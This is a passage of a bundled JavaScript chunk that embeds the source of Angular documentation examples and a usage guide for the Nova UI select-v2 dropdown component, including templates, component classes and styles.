selector: "nui-select-v2-disabled-example",\n    templateUrl: "./select-v2-disabled.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2DisabledExampleComponent {\n    public items: IExampleItem[] = Array.from({ length: 100 }).map((_, i) => ({\n        name: $localize`Item ${i}`,\n        disabled: Boolean(Math.round(Math.random())),\n    }));\n    public isSelectDisabled = false;\n}\n'},2496:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The <code>&lt;nui-select-v2&gt;</code> component allows users to select\n    item(s) from a list.\n</p>\n<p>\n    Select component is a perfect fit for simple cases or if your options list\n    is small enough. Otherwise consider using\n    <code\n        ><a href="../components/ComboboxV2Component.html" target="_blank"\n            >Combobox Component</a\n        ></code\n    >.\n</p>\n<p>\n    However, it\'s recommended to use Select component in case you need input\n    customization.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiSelectV2Module</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    To use <code>&lt;nui-select-v2&gt;</code> wrap each option within a\n    <code>&lt;select-v2-option&gt;</code> instance.\n    <code>&lt;select-v2-option&gt;</code> has the <code>value</code> input so\n    that it\'s <strong>unique</strong> for each option.\n</p>\n\n<p>\n    You can use a <code>string</code> or an <code>object</code> as a\n    <code>value</code>. In some cases, e.g. if using <em>Grouped items</em>,\n    it\'s recommended to use <code>object</code> and provide some id\'s, because\n    you can have the same option title in the different groups and it\'s\n    necessary to distinguish them somehow. Also, using <code>string</code> may\n    cause <code>i18n</code> issues as far as the same value is used for model\n    and displaying on the view.\n</p>\n\n<p>\n    Wrap all of the options inside a <code>&lt;nui-select-v2&gt;</code> instance\n    as a content projection for the dropdown.\n</p>\n\n<p>\n    You can put pretty much anything inside a\n    <code>&lt;nui-select-v2&gt;</code> dropdown. For example, if you need the\n    dropdown to display some info text, you can project\n    <em>standard HTML</em> into the dropdown and it will be shown as\n    <em>standard HTML</em> rather than a select option.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="select-v2-basic"\n    exampleTitle="Basic Usage"\n>\n    <nui-select-v2-basic-example></nui-select-v2-basic-example>\n</nui-example-wrapper>\n\n<h2>Getting and setting the select value</h2>\n\n<h3>Getting a Value</h3>\n<p>You can use the following ways to get a value from a select component:</p>\n<ul>\n    <li>Access the <code>value</code> property on the component</li>\n    <li>\n        Bind to the <code>valueSelected</code> output - emits the selected value\n    </li>\n</ul>\n\n<nui-example-wrapper\n    filenamePrefix="select-v2-getting-value"\n    exampleTitle="Getting value"\n>\n    <nui-select-v2-getting-value-example></nui-select-v2-getting-value-example>\n</nui-example-wrapper>\n\n<h3>Setting a Value</h3>\n<p>\n    To set a value for a select, you can use either the <code>value</code> input\n    or the reactive form control\n    <code\n        ><a\n            href="https://angular.io/guide/reactive-forms#replacing-a-form-control-value"\n            target="_blank"\n            >setValue</a\n        ></code\n    >\n    method, to provide an option from the list.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="select-v2-setting-value"\n    exampleTitle="Setting value"\n>\n    <nui-select-v2-setting-value-example></nui-select-v2-setting-value-example>\n</nui-example-wrapper>\n\n<h2>Customize Options</h2>\n<p>\n    It\'s possible to use a custom template for the <code>option</code>s in the\n    list. You can use pretty much any layout for the options by putting the\n    template inside a <code>&lt;select-v2-option&gt;</code> instance.\n</p>\n<p>\n    Also, it\'s possible to use custom template instead of default select input.\n    For that <code>[displayValueTemplate]</code> input is used.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <p>\n        <strong>Note:</strong> In this example\n        <code>[displayValueContext]</code> property of\n        <code>select-v2-option</code> element is used to pass a context to\n        custom input template.\n    </p>\n    All you put in <code>[displayValueContext]</code> input will be passed to\n    custom template <code>#customTemplate</code> as a context in the example.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="select-v2-customize-options"\n    exampleTitle="Customize Options"\n>\n    <nui-select-v2-customize-options-example></nui-select-v2-customize-options-example>\n</nui-example-wrapper>\n\n<h2>Custom Content and Styling</h2>\n<p>\n    You can use custom content for either <code>option</code> or select input or\n    dropdown content. <br />\n    To use custom content on select input use\n    <code>[displayValueContext]</code> input which takes\n    <code>templateRef</code> for the desired input. <br />\n    Note that you can use <code>[displayValueContext]</code> input on\n    <code>nui-select-v2-option</code> option element to pass a context for\n    custom input.<br />\n    To use some HTML in the dropdown just pass it as a content projection to\n    <code>nui-select-v2</code> together with options.\n</p>\n<p>\n    For styling the elements you can just apply desired styles to an element you\n    want to change visual representation.<br />\n    In this example, <code>.less</code> styles are used, you can check styles in\n    the code inspector.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-v2-custom-content"\n    exampleTitle="Custom Content"\n>\n    <nui-select-v2-custom-content-example></nui-select-v2-custom-content-example>\n</nui-example-wrapper>\n\n<h2>Grouped Options</h2>\n<p>\n    If you want to group options you can wrap them in a\n    <code>&lt;nui-select-v2-option-group&gt;</code>\n    instance. You can also provide a header for a group (optionally).\n</p>\n<p>\n    To use default styles for a header (as in the example below), apply\n    <code>.nui-select-v2-option-group--header</code> class to the header.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> Technically you can use any template instead of, or\n    in addition to, the header.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="select-v2-grouped-items"\n    exampleTitle="Grouped Options"\n>\n    <nui-select-v2-grouped-items-example></nui-select-v2-grouped-items-example>\n</nui-example-wrapper>\n\n<h2>Using With Reactive Forms</h2>\n<p>\n    To use <code>nui-select-v2</code> with reactive forms, create a\n    <code>FormControl</code> that represents the form model. Then, bind\n    <code>nui-select-v2</code> to this form element.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> It\'s recommended to use the\n    <code\n        ><a href="../components/FormFieldComponent.html" target="_blank"\n            >&lt;nui-form-field&gt;</a\n        ></code\n    >\n    component as a wrapper if you are going to use validation, captions, labels,\n    etc.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="select-v2-reactive-form-field"\n    exampleTitle="Reactive form field"\n>\n    <nui-select-v2-reactive-form-field-example></nui-select-v2-reactive-form-field-example>\n</nui-example-wrapper>\n\n<h2>Virtual Scroll</h2>\n<p>\n    The options dropdown can use virtual scroll. For that, wrap the options list\n    in a\n    <code\n        ><a\n            href="https://material.angular.io/cdk/scrolling/overview#virtual-scrolling"\n            target="_blank"\n            >cdk-virtual-scroll-viewport</a\n        ></code\n    >. You can adjust virtual scroll container to your needs according to\n    <a href="https://material.angular.io/cdk/scrolling/api"\n        >Virtual Scroll API</a\n    >.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <p>\n        <strong>Warning:</strong> All the items inside a dropdown\n        <strong>must</strong> be of the same height!\n    </p>\n    You should set <code>itemSize</code> property of\n    <code>cdk-virtual-scroll-viewport</code> to the <strong>exact</strong> value\n    of an option height. Otherwise, some features may not work.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="select-v2-virtual-scroll"\n    exampleTitle="Virtual Scroll"\n>\n    <nui-select-v2-virtual-scroll-example></nui-select-v2-virtual-scroll-example>\n</nui-example-wrapper>\n\n<h2>Disabled Mode</h2>\n<p>\n    It is possible to disable either the entire <code>select-v2</code> or one or\n    more <code>select-v2-option</code>s. To do that, set the\n    <code>isDisabled</code> input to true on the appropriate component.\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-v2-disabled"\n    exampleTitle="Disabled Mode"\n>\n    <nui-select-v2-disabled-example></nui-select-v2-disabled-example>\n</nui-example-wrapper>\n\n<h2>Error State</h2>\n<p>\n    The <code>isInErrorState</code> input is used to set/change the visual\n    validation state of the component. This can be used in custom situations in\n    which you need to manually indicate that the component is in error state.\n</p>\n<nui-message type="warning" [allowDismiss]="false">\n    <strong>Note:</strong> If you want to use a select as a form field with\n    validation, consider using the\n    <code\n        ><a href="../components/FormFieldComponent.html" target="_blank"\n            >nui-form-field</a\n        ></code\n    >\n    component. For information about that, see the\n    <strong>Using With Reactive Forms</strong> section.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="select-v2-error"\n    exampleTitle="Error state"\n>\n    <nui-select-v2-error-example></nui-select-v2-error-example>\n</nui-example-wrapper>\n\n<h2>Styling</h2>\n<p>\n    To style the select\'s dropdown simply use <code>overlayConfig</code> input\n    and fill in its <code>panelClass</code> property with the global CSS class\n    with the desired styles.\n</p>\n<nui-example-wrapper filenamePrefix="select-v2-styling" exampleTitle="Styling">\n    <nui-select-v2-styling-example></nui-select-v2-styling-example>\n</nui-example-wrapper>\n\n<h2>Inline Display Mode</h2>\n<p>\n    To put a select in inline display mode, add necessary styles to the\n    component. For example, you can add bootstrap\n    <code>d-inline-flex</code> style.\n</p>\n<nui-example-wrapper filenamePrefix="select-v2-inline" exampleTitle="Inline">\n    <nui-select-v2-inline-example></nui-select-v2-inline-example>\n</nui-example-wrapper>\n\n<h2>Overlay configuration</h2>\n<p>\n    To adjust <code>SelectComponent</code>\'s popup overlay properties, such as\n    <code>width</code>, <code>height</code> or other, set the\n    <code>overlayConfig</code> input in accordance with Angular CDK Overlay\n    Config\n    <a href="https://material.angular.io/cdk/overlay/api#OverlayConfig"\n        >interface</a\n    ><br />\n    <mark\n        >NOTE: in case you need to set the <code>width</code> using the overlay\n        config make sure to disable the automatic width synchronization, which\n        is enabled by default. This can be done by setting the\n        <code>syncWidth</code> input to <code>false</code></mark\n    >\n    <nui-message type="info" [allowDismiss]="false">\n        <strong>Note:</strong> Select-v2 and Combobox-v2 contain default\n        <code>with-popup-styles</code> (you can import it\n        <code>POPUP_STYLES_CLASS</code> from <code>@nova-ui/bits</code>) class\n        which styles the popup according to the Nova Design Language. Setting\n        custom styles through the global classes using the `panelClass` will\n        override the default styles of the overlay. If you want to preserve\n        default overlay styles please consider adding the\n        <code>with-popup-styles</code> class when setting styles using the\n        <code>overlayConfig</code>. Please see the example below.\n    </nui-message>\n</p>\n<nui-example-wrapper\n    filenamePrefix="select-v2-overlay-config"\n    exampleTitle="Overlay configuration"\n>\n    <nui-select-v2-overlay-config-example></nui-select-v2-overlay-config-example>\n</nui-example-wrapper>\n\n<h2>Custom Dropdown Control</h2>\n<p>\n    The <code>manualDropdownControl</code> input gives you total control over\n    opening and closing the dropdown. When set to <code>true</code>, the default\n    behavior of the dropdown is blocked, and you can provide your own behavior.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> The <code>clickOutsideDropdown</code> output can be\n    used to close the dropdown manually on clicks outside both the host element\n    and the dropdown.\n</nui-message>\n<nui-message type="info" [allowDismiss]="false">\n    <strong>Note:</strong> In order for keyboard navigation work as you open the\n    dropdown you have to manually set focus to the <code>inputElement</code> in\n    case you are triggering the dropdown outside the host element. For that, you\n    can do <code>select.inputElement.nativeElement.focus()</code>\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="select-v2-custom-control"\n    exampleTitle="Custom Control"\n>\n    <nui-select-v2-custom-control-example></nui-select-v2-custom-control-example>\n</nui-example-wrapper>\n\n<h2>Color Picker</h2>\n<p>\n    <code>nui-select-v2</code> can be customized in a number of ways, including\n    such a popular use case like color picker. The example below is purely based\n    on <code>select-v2</code> and <code>select-v2-option</code> components, and\n    only requires adding some css. Check the example below.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="select-v2-color-picker"\n    exampleTitle="Color Picker"\n>\n    <nui-select-v2-color-picker></nui-select-v2-color-picker>\n</nui-example-wrapper>\n\n<h2>Keyboard interaction</h2>\n<p>\n    <code>&lt;nui-select-v2&gt;</code> comes with built-in accessibility\n    features:\n</p>\n<ul>\n    <li><code>TAB/Shift+TAB</code> for focusing the component.</li>\n    <li>\n        <code>ARROW UP/ARROW DOWN</code> for navigation inside an option list.\n    </li>\n    <li>\n        <code>PAGE UP/PAGE DOWN</code> for navigation inside the list to\n        top/bottom.\n    </li>\n    <li><code>ENTER</code> to select an option.</li>\n    <li><code>ESC</code> to close the dropdown.</li>\n</ul>\n'},1208:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=":host {\n    .select-container {\n        margin: 0;\n    }\n    ul {\n        padding-left: 40px;\n\n        li {\n            list-style: disc;\n        }\n    }\n}\n"},54048:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-v2-docs-example",\n    templateUrl: "./select-v2-docs.example.component.html",\n    styleUrls: ["select-v2-docs.example.component.less"],\n})\nexport class SelectV2DocsComponent {}\n'},18652:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    [isInErrorState]="error"\n    placeholder="Select Item"\n    i18n-placeholder\n    class="w-50 d-inline-flex"\n>\n    <ng-container *ngFor="let item of items">\n        <nui-select-v2-option [value]="item">\n            {{ item }}\n        </nui-select-v2-option>\n    </ng-container>\n</nui-select-v2>\n\n<nui-switch\n    class="d-inline-flex"\n    style="padding-left: 15px"\n    [(value)]="error"\n    i18n\n>\n    Toggle error state\n</nui-switch>\n'},22220:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-v2-error-example",\n    templateUrl: "./select-v2-error.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2ErrorExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public error: boolean = false;\n}\n'},7348:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<b>Accessing value using <code>value</code></b>\n<nui-select-v2 #selectValueExample placeholder="Select Item" i18n-placeholder>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n<p class="my-3">You selected: {{ selectValueExample.value }}</p>\n\n<b>Accessing value using <code>valueSelected</code> output</b>\n<nui-select-v2\n    #selectValueSelectedExample\n    placeholder="Select Item"\n    i18n-placeholder\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n<p class="my-3">You selected: {{ selectValueSelectedValue }}</p>\n'},49716:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, ViewChild } from "@angular/core";\nimport { Subject } from "rxjs";\nimport { takeUntil, tap } from "rxjs/operators";\n\nimport { SelectV2Component } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-v2-getting-value-example",\n    templateUrl: "select-v2-getting-value.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2GettingValueExampleComponent implements AfterViewInit {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public selectValueSelectedValue: string;\n\n    @ViewChild("selectValueSelectedExample")\n    private selectValueSelectedExample: SelectV2Component;\n    private destroy$: Subject<any> = new Subject<any>();\n\n    public ngAfterViewInit(): void {\n        this.selectValueSelectedExample.valueSelected\n            .pipe(\n                tap(\n                    (value) => (this.selectValueSelectedValue = value as string)\n                ),\n                takeUntil(this.destroy$)\n            )\n            .subscribe();\n    }\n}\n'},31136:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2 placeholder="Select Item" i18n-placeholder>\n    <nui-select-v2-option-group\n        *ngFor="let itemGroup of items; let last = last"\n    >\n        <span class="nui-select-v2-option-group--header">{{\n            itemGroup.header\n        }}</span>\n        <nui-select-v2-option\n            *ngFor="let item of itemGroup.items"\n            [value]="item"\n        >\n            {{ item.name }}\n        </nui-select-v2-option>\n        <nui-divider *ngIf="!last" size="extra-small"></nui-divider>\n    </nui-select-v2-option-group>\n</nui-select-v2>\n'},4448:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ISelectGroup } from "@nova-ui/bits";\n\nconst getRandomNumberTo = (max: number) =>\n    Math.floor(Math.random() * Math.floor(max) + 1);\n\n@Component({\n    selector: "nui-select-v2-grouped-items-example",\n    templateUrl: "select-v2-grouped-items.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2GroupedItemsExampleComponent {\n    public items: ISelectGroup[] = Array.from({ length: 10 }).map((_, i) => ({\n        header: $localize`Header line ${i + 1}`,\n        items: Array.from({ length: getRandomNumberTo(5) }).map((v, n) => ({\n            id: `value-${i}`,\n            name: $localize`Item ${n + 1}`,\n        })),\n    }));\n}\n'},54044:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    class="d-inline-flex"\n    placeholder="Select Item"\n    i18n-placeholder\n    style="margin-right: 15px"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item"\n        >{{ item }}\n    </nui-select-v2-option>\n</nui-select-v2>\n\n<nui-select-v2 class="d-inline-flex" placeholder="Select Item" i18n-placeholder>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n'},91948:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-select-v2-inline-example",\n    templateUrl: "./select-v2-inline.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2InlineExampleComponent {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n}\n'},92500:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>Value: {{ select.value }}</p>\n<p>FormControl.value: {{ selectControl.value }}</p>\n\n<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="selectControl"\n    #select\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setItems(0)"\n>\n    Set items: 1, 2, 3, 4\n</button>\n<button\n    nui-button\n    type="button"\n    displayStyle="action"\n    i18n\n    (click)="setItems(1)"\n>\n    Set items: 3, 4, 5, 6\n</button>\n'},17748:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnInit } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-select-v2-options-changed-example",\n    templateUrl: "select-v2-options-changed.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2OptionsChangedExampleComponent implements OnInit {\n    public items: string[] = [];\n    public selectControl = new FormControl<string | null>(null);\n    private itemSet = [\n        [\n            $localize`Item 1`,\n            $localize`Item 2`,\n            $localize`Item 3`,\n            $localize`Item 4`,\n        ],\n        [\n            $localize`Item 3`,\n            $localize`Item 4`,\n            $localize`Item 5`,\n            $localize`Item 6`,\n        ],\n    ];\n\n    public ngOnInit(): void {\n        this.items = this.itemSet[0];\n    }\n\n    public setItems(i: number): void {\n        this.items = this.itemSet[i];\n    }\n}\n'},28988:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [overlayConfig]="overlayConfig"\n    [syncWidth]="false"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n'},18444:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component } from "@angular/core";\n\nimport { OVERLAY_WITH_POPUP_STYLES_CLASS } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-v2-overlay-config-example",\n    templateUrl: "./select-v2-overlay-config.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2OverlayConfigExampleComponent {\n    public overlayConfig: OverlayConfig = {\n        width: 300,\n        height: 200,\n        panelClass: [\n            OVERLAY_WITH_POPUP_STYLES_CLASS,\n            "overlay-config-demo-custom-class",\n        ],\n    };\n\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n}\n'},17408:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="fancyForm" class="nui-edge-definer" style="max-width: 30%">\n    <nui-form-field\n        caption="Select"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'select\']"\n    >\n        <nui-select-v2\n            placeholder="Select Item"\n            i18n-placeholder\n            formControlName="select"\n        >\n            <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n                item\n            }}</nui-select-v2-option>\n        </nui-select-v2>\n        <nui-validation-message for="required">\n            This field is required\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n'},84544:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  